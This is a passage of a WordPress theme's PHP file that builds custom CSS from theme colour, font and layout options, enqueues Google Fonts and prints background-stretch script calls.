		$output .= '.darkheader .nav-primary, .darkheader .nav-primary ul, .darkheader .nav-primary .nav-menu a, .darkheader .nav-primary.toggled-on .nav-menu a, .darkheader .nav-primary.toggled-on .nav-menu ul a { border-color:'.$topnav_drop_border.' ; background-color:'.$topnav_bg.'; }' . "\n";
	if ( $topnav_link ) 
		$output .= '.nav-primary a { color:'.$topnav_link.'; }' . "\n";
	if ( $topnav_link ) 
		$output .= '.darkheader .nav-primary a { color:'.$topnav_link.'; }' . "\n";
	if ( $topnav_link_hover ) 
		$output .= '.nav-primary a:hover { color:'.$topnav_link_hover.'; }' . "\n";
	if ( $topnav_link_hover ) 
		$output .= '.darkheader .nav-primary a:hover { color:'.$topnav_link_hover.'; }' . "\n";
	if ( $topnav_link_current ) 
		$output .= '.nav-primary .current_page_item > a, .nav-primary .current_page_ancestor > a, .nav-primary .current-menu-item > a, .nav-primary .current-menu-ancestor > a { color:'.$topnav_link_current.'; }' . "\n";
	if ( $topnav_link_current ) 
		$output .= '.darkheader .nav-primary .current_page_item > a, .darkheader .nav-primary .current_page_ancestor > a, .darkheader .nav-primary .current-menu-item > a, .darkheader .nav-primary .current-menu-ancestor > a { color:'.$topnav_link_current.'; }' . "\n";
	if ( $topnav_icon ) 
		$output .= '.nav-primary a.search-button, .nav-primary .menu-toggle, .nav-primary .subicon { color:'.$topnav_icon.'; }' . "\n";
	if ( $topnav_icon ) 
		$output .= '.darkheader .nav-primary a.search-button, .darkheader .nav-primary .menu-toggle, .darkheader .nav-primary .subicon { color:'.$topnav_icon.'; }' . "\n";

// Header Nav Colors

	$headernav_bg = tb_option('headernav_bg_color');
	$headernav_link = tb_option('headernav_link_color'); 
	$headernav_link_hover = tb_option('headernav_link_hover_color'); 
	$headernav_link_current = tb_option('headernav_link_current_color');
	$headernav_icon = tb_option('headernav_icon_color');
	$headernav_drop_border = tb_option('headernav_drop_border_color');

	if ( $headernav_bg ) 
		$output .= '.nav-secondary, .nav-secondary ul, .nav-secondary .nav-menu a, .nav-secondary.toggled-on .nav-menu a, .nav-secondary.toggled-on .nav-menu ul a { border-color:'.$headernav_drop_border.'; background-color:'.$headernav_bg.'; }' . "\n";
	if ( $headernav_bg ) 
		$output .= '.darkheader .nav-secondary, .darkheader .nav-secondary ul, .darkheader .nav-secondary .nav-menu a, .darkheader .nav-secondary.toggled-on .nav-menu a, .darkheader .nav-secondary.toggled-on .nav-menu ul a { border-color:'.$headernav_drop_border.'; background-color:'.$headernav_bg.'; }' . "\n";
	if ( $headernav_link ) 
		$output .= '.nav-secondary a { color:'.$headernav_link.'; }' . "\n";
	if ( $headernav_link ) 
		$output .= '.darkheader .nav-secondary a { color:'.$headernav_link.'; }' . "\n";
	if ( $headernav_link_hover ) 
		$output .= '.nav-secondary a:hover { color:'.$headernav_link_hover.'; }' . "\n";
	if ( $headernav_link_hover ) 
		$output .= '.darkheader .nav-secondary a:hover { color:'.$headernav_link_hover.'; }' . "\n";
	if ( $headernav_link_current ) 
		$output .= '.nav-secondary .current_page_item > a, .nav-secondary .current_page_ancestor > a, .nav-secondary .current-menu-item > a, .nav-secondary .current-menu-ancestor > a { color:'.$headernav_link_current.'; }' . "\n";
	if ( $headernav_link_current ) 
		$output .= '.darkheader .nav-secondary .current_page_item > a, .darkheader .nav-secondary .current_page_ancestor > a, .darkheader .nav-secondary .current-menu-item > a, .darkheader .nav-secondary .current-menu-ancestor > a { color:'.$headernav_link_current.'; }' . "\n";
	if ( $headernav_icon ) 
		$output .= '.nav-secondary a.search-button, .nav-secondary .menu-toggle, .nav-secondary .subicon { color:'.$headernav_icon.'; }' . "\n";
	if ( $headernav_icon ) 
		$output .= '.darkheader .nav-secondary a.search-button, .darkheader .nav-secondary .menu-toggle, .darkheader .nav-secondary .subicon { color:'.$headernav_icon.'; }' . "\n";

// Fixed Nav Colors

	$fixednav_bg = tb_option('fixednav_bg_color');
	$fixednav_link = tb_option('fixednav_link_color'); 
	$fixednav_link_hover = tb_option('fixednav_link_hover_color'); 
	$fixednav_link_current = tb_option('fixednav_link_current_color');
	$fixednav_icon = tb_option('fixednav_icon_color');
	$fixednav_drop_border = tb_option('fixednav_drop_border_color');

	if ( $fixednav_bg ) 
		$output .= '.nav-fixed, .nav-fixed ul, .nav-fixed .nav-menu a, .nav-fixed.toggled-on .nav-menu a, .nav-fixed.toggled-on .nav-menu ul a { border-color:'.$fixednav_drop_border.'; background-color:'.$fixednav_bg.'; }' . "\n";
	if ( $fixednav_bg ) 
		$output .= '.darkheader .nav-fixed, .darkheader .nav-fixed ul, .darkheader .nav-fixed .nav-menu a, .darkheader .nav-fixed.toggled-on .nav-menu a, .darkheader .nav-fixed.toggled-on .nav-menu ul a { border-color:'.$fixednav_drop_border.'; background-color:'.$fixednav_bg.'; }' . "\n";
	if ( $fixednav_link ) 
		$output .= '.nav-fixed a { color:'.$fixednav_link.'; }' . "\n";
	if ( $fixednav_link ) 
		$output .= '.darkheader .nav-fixed a { color:'.$fixednav_link.'; }' . "\n";
	if ( $fixednav_link_hover ) 
		$output .= '.nav-fixed a:hover { color:'.$fixednav_link_hover.'; }' . "\n";
	if ( $fixednav_link_hover ) 
		$output .= '.darkheader .nav-fixed a:hover { color:'.$fixednav_link_hover.'; }' . "\n";
	if ( $fixednav_link_current ) 
		$output .= '.nav-fixed .current_page_item > a, .nav-fixed .current_page_ancestor > a, .nav-fixed .current-menu-item > a, .nav-fixed .current-menu-ancestor > a { color:'.$fixednav_link_current.'; }' . "\n";
	if ( $fixednav_link_current ) 
		$output .= '.darkheader .nav-fixed .current_page_item > a, .darkheader .nav-fixed .current_page_ancestor > a, .darkheader .nav-fixed .current-menu-item > a, .darkheader .nav-fixed .current-menu-ancestor > a { color:'.$fixednav_link_current.'; }' . "\n";
	if ( $fixednav_icon ) 
		$output .= '.nav-fixed a.search-button, .nav-fixed .menu-toggle, .nav-fixed .subicon { color:'.$fixednav_icon.'; }' . "\n";
	if ( $fixednav_icon ) 
		$output .= '.darkheader .nav-fixed a.search-button, .darkheader .nav-fixed .menu-toggle, .darkheader .nav-fixed .subicon { color:'.$fixednav_icon.'; }' . "\n";

// Header Color Options

	$header_bg_color = tb_option('header_bg_color');
	$header_border_color = tb_option('header_border_color');
	$title_icon_color = tb_option('site_title_icon_color');
	$title_color = tb_option('site_title_color');
	$tagline_color = tb_option('tagline_color');

	if ( $header_bg_color ) 
		$output .= '.site-header { background-color:'.$header_bg_color.' !important;}' . "\n";
	if ( $header_bg_color ) 
		$output .= '.darkheader .site-header { background-color:'.$header_bg_color.' !important;}' . "\n";
	if ( $header_border_color ) 
		$output .= '.site-header { border-color:'.$header_border_color.' !important;}' . "\n";
	if ( $header_border_color ) 
		$output .= '.darkheader .site-header { border-color:'.$header_border_color.' !important;}' . "\n";
	if ( $title_color ) 
		$output .= '.site-title { color:'.$title_color.'!important;}' . "\n";
	if ( $title_color ) 
		$output .= '.darkheader .site-title { color:'.$title_color.'!important;}' . "\n";
	if ( $tagline_color ) 
		$output .= '.site-description { color:'.$tagline_color.'!important;}' . "\n";
	if ( $tagline_color ) 
		$output .= '.darkheader .site-description { color:'.$tagline_color.'!important;}' . "\n";
	if ( $title_icon_color ) 
		$output .= '.site-title i { color:'.$title_icon_color.';}' . "\n";

// Body Color Options

	$body_text_color = tb_option('body_text_color');
	$body_headings_color = tb_option('body_headings_color');
	$body_link_color = tb_option('body_link_color');
	$body_link_hover_color = tb_option('body_link_hover_color');
	$post_title_link_color = tb_option('post_title_link_color');
	$post_title_link_hover_color = tb_option('post_title_link_hover_color');

	if ( $body_text_color ) 
		$output .= '.site-inner { color:'.$body_text_color.'; }' . "\n";
	if ( $body_headings_color ) 
		$output .= '.site-inner h1,.site-inner h2,.site-inner h3,.site-inner h4,.site-inner h5,.site-inner h6 { color:'.$body_headings_color.'; }' . "\n";
	if ( $body_link_color ) 
		$output .= '.site-inner a, .site-inner a:link, .site-inner a:visited { color:'.$body_link_color.'; }' . "\n";
	if ( $body_link_hover_color ) 
		$output .= '.site-inner a:hover, .site-inner a:active, .site-inner a:focus { color:'.$body_link_hover_color.'; }' . "\n";
	if ( $post_title_link_color ) 
		$output .= '.entry-title a, .entry-title a:link, .entry-title a:visited { color:'.$post_title_link_color.'; }' . "\n";
	if ( $post_title_link_hover_color ) 
		$output .= '.entry-title a:hover, .entry-title a:active, .entry-title a:focus { color:'.$post_title_link_hover_color.'; }' . "\n";

// Footer Widgets Color Options

	$footer_widgets_bg_color = tb_option('footer_widgets_bg_color');
	$footer_widgets_border_color = tb_option('footer_widgets_border_color');
	$footer_widgets_text_color = tb_option('footer_widgets_text_color');
	$footer_widgets_headings_color = tb_option('footer_widgets_headings_color');
	$footer_widgets_link_color = tb_option('footer_widgets_link_color');
	$footer_widgets_link_hover_color = tb_option('footer_widgets_link_hover_color');

	if ( $footer_widgets_bg_color ) 
		$output .= '#footer-widgets { background-color:'.$footer_widgets_bg_color.'; }' . "\n";
	if ( $footer_widgets_border_color ) 
		$output .= '#footer-widgets { border-color:'.$footer_widgets_border_color.'; }' . "\n";
	if ( $footer_widgets_text_color ) 
		$output .= '#footer-widgets { color:'.$footer_widgets_text_color.'; }' . "\n";
	if ( $footer_widgets_headings_color ) 
		$output .= '#footer-widgets h1, #footer-widgets h2, footer-widgets h3, #footer-widgets h4, #footer-widgets h5, #footer-widgets h6 { color:'.$footer_widgets_headings_color.'; }' . "\n";
	if ( $footer_widgets_link_color ) 
		$output .= '#footer-widgets a, #footer-widgets a:link, #footer-widgets a:visited { color:'.$footer_widgets_link_color.'; }' . "\n";
	if ( $footer_widgets_link_hover_color ) 
		$output .= '#footer-widgets a:hover, #footer-widgets a:active, #footer-widgets a:focus { color:'.$footer_widgets_link_hover_color.'; }' . "\n";

// Footer Color Options

	$footer_bg_color = tb_option('footer_bg_color');
	$footer_border_color = tb_option('footer_border_color');
	$footer_text_color = tb_option('footer_text_color');
	$footer_link_color = tb_option('footer_link_color');
	$footer_link_hover_color = tb_option('footer_link_hover_color');
	$footer_icon_color = tb_option('footer_icon_color');

	if ( $footer_bg_color ) 
		$output .= '.site-footer { background-color:'.$footer_bg_color.'; }' . "\n";
	if ( $footer_border_color ) 
		$output .= '.site-footer { border-color:'.$footer_border_color.'; }' . "\n";
	if ( $footer_text_color ) 
		$output .= '.site-footer { color:'.$footer_text_color.'; }' . "\n";
	if ( $footer_link_color ) 
		$output .= '.site-footer a, .site-footer a:link, .site-footer a:visited { color:'.$footer_link_color.'; }' . "\n";
	if ( $footer_link_hover_color ) 
		$output .= '.site-footer a:hover, .site-footer a:active, .site-footer a:focus { color:'.$footer_link_hover_color.'; }' . "\n";
	if ( $footer_icon_color ) 
		$output .= '.site-footer .site-icons a { color:'.$footer_icon_color.' !important; } .site-footer .site-icons a:hover { color:#fff !important }' . "\n";

// Post By Cat Color Options

	$postbycat_bg_color = tb_option('postbycat_bg_color');
	$postbycat_link_color = tb_option('postbycat_link_color');
	$postbycat_border = tb_option('postbycat_border');

	if ( $postbycat_bg_color ) 
		$output .= 'h2.feat-title { background-color:'.$postbycat_bg_color.'; }' . "\n";
	if ( $postbycat_bg_color == '#fff' || $postbycat_bg_color == '#ffffff' ) 
		$output .= 'h2.feat-title { padding:0 0 3px; }' . "\n";
	if ( $postbycat_link_color ) 
		$output .= 'h2.feat-title a, h2.feat-title, h2.feat-title i { color:'.$postbycat_link_color.' !important; }' . "\n";
	if ( $postbycat_border ) 
		$output .= 'h2.feat-title { background-image:url(' . get_template_directory_uri() . '/images/dotted-line.png); background-position:bottom left; background-repeat:repeat-x; }' . "\n";

// Hide Banner Ads on Single Post or Page

	if ( is_singular() && get_post_meta($post->ID, 'tb_hide_ads', true) )
		$output .= '.banner-ad { display:none !important; }' . "\n";

// Hide Post Title or Page Title

	if ( is_single() && get_post_meta($post->ID, 'tb_hide_stuff', true) && in_array('hide_title', get_post_meta($post->ID, 'tb_hide_stuff', true) ) )
		$output .= '.entry-title, .entry-meta { display:none; }' . "\n" . '.entry-footer .entry-meta { display:block; }' . "\n";
	if ( is_page() && get_post_meta($post->ID, 'tb_hide_stuff', true) && in_array('hide_title', get_post_meta($post->ID, 'tb_hide_stuff', true) ) )
		$output .= '.entry-title.page { display:none; }' . "\n";

// Hide Read More Button is Active in Post Meta

	$postmeta = tb_option('bottom_postmeta');
	if ( in_array('read-more', $postmeta) )
		$output .= '.read-more { display:none !important; }' . "\n";

// Post Bottom Widget Area

	$postbottom = '';
	$post_bottom_bg = tb_option('post_bottom_bg');
	$post_bottom_align = tb_option('post_bottom_align');
	$post_bottom_padding = tb_option('post_bottom_padding');
	$post_bottom_border_size = tb_option('post_bottom_border_size');
	$post_bottom_border_color = tb_option('post_bottom_border_color');
	$post_bottom_font_color = tb_option('post_bottom_font_color');
	$post_bottom_link_color = tb_option('post_bottom_link_color');
	$post_bottom_link_hover_color = tb_option('post_bottom_link_hover_color');


	if ( $post_bottom_bg )
		$postbottom .= 'background-color:'.$post_bottom_bg.';';
	if ( $post_bottom_align )
		$postbottom .= 'text-align:'.$post_bottom_align.';';
	if ( $post_bottom_padding )
		$postbottom .= 'padding:'.$post_bottom_padding.'px;';
	if ( $post_bottom_border_size )
		$postbottom .= 'border-style:solid;border-width:'.$post_bottom_border_size.'px;';
	if ( $post_bottom_border_color )
		$postbottom .= 'border-color:'.$post_bottom_border_color.';';
	if ( $post_bottom_font_color )
		$postbottom .= 'color:'.$post_bottom_font_color.' !important;';
	if ( $postbottom )
		$output .= '.single-post-bottom { '.$postbottom.' }'. "\n";

	if ( $post_bottom_link_color )
		$output .= '.single-post-bottom a, .single-post-bottom a:link, .single-post-bottom a:visited { color:'.$post_bottom_link_color.' !important; }' . "\n";
	if ( $post_bottom_link_hover_color )
		$output .= '.single-post-bottom a:hover, .single-post-bottom a:active { color:'.$post_bottom_link_hover_color.' !important; }' . "\n";
	if ( $post_bottom_font_color )
		$output .= '.single-post-bottom .widgettitle { color:'.$post_bottom_font_color.' !important; }' . "\n";

// Custom CSS

	$custom_css = tb_option('custom_css');

	if ($custom_css)
		$output .= $custom_css . "\n";

// Output styles

	if ( $output )
		$output = "\n\n<!-- Custom Styles from Theme Setting Page -->\n<style type=\"text/css\">\n" . $output . "</style>\n";
		echo $output;
}



/*---------------------------------------------------------------------------------------*/
// Font Embed Function for Google Fonts
// @since 1.0
/*---------------------------------------------------------------------------------------*/

// Here we populate the font face
$header_font = tb_option('header_font');
$header_weight = tb_option('header_weight');
$header_style = tb_option('header_style');
$headings_font = tb_option('headings_font');
$headings_weight = tb_option('headings_weight');
$headings_style = tb_option('headings_style');
$body_font = tb_option('body_font');
$body_weight = tb_option('body_weight');
$body_style = tb_option('body_style');
$topnav_font = tb_option('topnav_font');
$topnav_weight = tb_option('topnav_weight');
$topnav_style = tb_option('topnav_style');
$headernav_font = tb_option('headernav_font');
$headernav_weight = tb_option('headernav_weight');
$headernav_style = tb_option('headernav_style');
$postmeta_font = tb_option('postmeta_font');
$postmeta_weight = tb_option('postmeta_weight');
$postmeta_style = tb_option('postmeta_style');

// Add the font to the helper class
VP_Site_GoogleWebFont::instance()->add($header_font, $header_weight, $header_style);
VP_Site_GoogleWebFont::instance()->add($headings_font, $headings_weight, $headings_style);
VP_Site_GoogleWebFont::instance()->add($body_font, $body_weight, $body_style);
VP_Site_GoogleWebFont::instance()->add($topnav_font, $topnav_weight, $topnav_style);
VP_Site_GoogleWebFont::instance()->add($headernav_font, $headernav_weight, $headernav_style);
VP_Site_GoogleWebFont::instance()->add($postmeta_font, $postmeta_weight, $postmeta_style);

add_action('wp_enqueue_scripts', 'tb_embed_fonts');
function tb_embed_fonts() {
	if ( tb_option('use_google_fonts') ) {
		VP_Site_GoogleWebFont::instance()->register_and_enqueue();
	}
}



/*---------------------------------------------------------------------------------------*/
// Javascript for Backstretch Body Background Image
// @since 1.0
/*---------------------------------------------------------------------------------------*/

if ( !is_admin() ) { add_action('wp_footer', 'themebeagle_backstretch', 99); }
function themebeagle_backstretch() {

	$bgimage = tb_option('body_bg_image');
	$bgimage_url = get_template_directory_uri().'/images/'.$bgimage.'.jpg';
	$bgcustom_options = tb_option('custom_bg_on');
	$bgbackstretch = tb_option('backstretch_on');
	$bgbackstretch_pos_x = tb_option('backstretch_pos_x');
	$bgbackstretch_pos_y = tb_option('backstretch_pos_y');
	$bg_custom_backstretch_url = tb_option('custom_body_bg_image');

	if ( $bgimage != 'none' && !$bgcustom_options && !is_page_template('page-landing.php') ) { ?>

		<!-- Backstretch JS -->
		<script type="text/javascript">
			jQuery.anystretch("<?php echo $bgimage_url; ?>",{positionX:"<?php echo $bgbackstretch_pos_x; ?>",positionY:"<?php echo $bgbackstretch_pos_y; ?>",speed:500});
		</script>

	<?php }

	if ( $bgcustom_options && $bgbackstretch && !is_page_template('page-landing.php') ) { ?>

		<!-- Backstretch JS -->
		<script type="text/javascript">
			jQuery.anystretch("<?php echo $bg_custom_backstretch_url; ?>",{positionX:"<?php echo $bgbackstretch_pos_x; ?>",positionY:"<?php echo $bgbackstretch_pos_y; ?>",speed: 500});
		</script>

	<?php }
}

?>